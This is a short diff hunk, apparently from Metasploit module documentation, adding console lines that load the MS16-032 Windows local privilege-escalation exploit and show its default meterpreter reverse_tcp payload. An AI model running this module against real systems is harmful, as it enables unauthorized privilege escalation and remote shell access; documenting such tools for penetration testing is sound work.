@@ -25,6 +25,8 @@ Exploit target:
    0   Windows x86
    
    
+msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp   
 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
 
 Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
